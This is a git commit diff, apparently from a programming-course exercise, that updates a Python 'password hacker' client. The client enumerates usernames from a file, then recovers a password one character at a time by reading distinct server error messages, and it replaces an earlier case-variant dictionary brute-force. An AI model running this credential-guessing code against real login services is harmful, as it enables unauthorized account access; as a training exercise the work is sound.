38ada38939073052c93ee0d46f71f9ee2b7365dd
Georgij Kocsarjan <georgij.kocsarjan@gmail.com>
2024-02-18 15:38:46 +0100

    Pass Stage 4

--- hack.py
+++ hack.py
@@ -1,3 +1,4 @@
+import json
 import utilities
 import itertools
 
@@ -5,24 +6,8 @@ chunk_size = 1024
 args = utilities.return_args()
 ip_address = args.ip_address
 port = int(args.port)
-
 with utilities.create_socket(ip_address, port) as client_socket:
-    is_break = False
-    previous_word = ''
-    for row in utilities.read_file('passwords.txt'):
-        typical_pass = row.rstrip('\n')
-        combinations = [''.join(chars) for chars in itertools.product(*[(c.lower(), c.upper()) for c in typical_pass])]
-        for psswrd in combinations:
-            message = psswrd.encode('utf-8')
-            try:
-                client_socket.send(message)
-                response = client_socket.recv(chunk_size).decode('utf-8')
-            except:
-                pass
-            is_success = True if response == 'Connection success!' else False
-            if is_success:
-                print(psswrd)
-                is_break = True
-                break
-            if message.isdigit():
-                break
+    correct_login = utilities.find_login(client_socket, chunk_size)
+    correct_dict = utilities.find_password(client_socket, chunk_size, correct_login)
+print(json.dumps(correct_dict))
+
--- utilities.py
+++ utilities.py
@@ -1,12 +1,15 @@
 import argparse
 import socket
+import json
+import string
+
+all_chars = string.ascii_letters + string.digits + string.punctuation
 
 
 def return_args():
     parser = argparse.ArgumentParser()
     parser.add_argument('ip_address')
     parser.add_argument('port')
-    # parser.add_argument('message')
     args = parser.parse_args()
     return args
 
@@ -16,8 +19,59 @@ def create_socket(ip, port):
     client_socket.connect((ip, port))
     return client_socket
 
+
 def read_file(path):
     with open(path, 'r') as file:
         for row in file:
             yield row
 
+
+def find_login(client_socket, chunk_size):
+        for login in read_file('logins.txt'):
+            login = login.strip('\n')
+            json_login = {'login': login, 'password': ''}
+            message = json.dumps(json_login, indent=4)
+            try:
+                client_socket.send(message.encode('utf-8'))
+                response = client_socket.recv(chunk_size).decode('utf-8')
+            except:
+                pass
+            returned_str = json.loads(response)
+            if returned_str['result'] == 'Wrong password!':
+                return json_login['login']
+
+
+
+def find_password(client_socket, chunk_size,  correct_login):
+    char_list = list(all_chars)
+    for single_char in char_list:
+        json_login = {'login': correct_login, 'password': single_char}
+        message = json.dumps(json_login, indent=4)
+        try:
+            client_socket.send(message.encode('utf-8'))
+            response = client_socket.recv(chunk_size).decode('utf-8')
+        except:
+            pass
+        returned_str = json.loads(response)
+        if returned_str['result'] == 'Exception happened during login':
+            guessed_password = json_login['password']
+            char_index = 0
+            while response != 'Connection success!':
+                password = guessed_password
+                password += char_list[char_index]
+                char_index += 1
+                json_login['password'] = password
+                message = json.dumps(json_login, indent=4)
+                try:
+                    client_socket.send(message.encode('utf-8'))
+                    response = client_socket.recv(chunk_size).decode('utf-8')
+                except:
+                    pass
+                returned_str = json.loads(response)
+                if returned_str['result'] == 'Exception happened during login':
+                    guessed_password = password
+                    char_index = 0
+                elif returned_str['result'] == 'Connection success!':
+                    return json_login
+                    break
+    return json_login
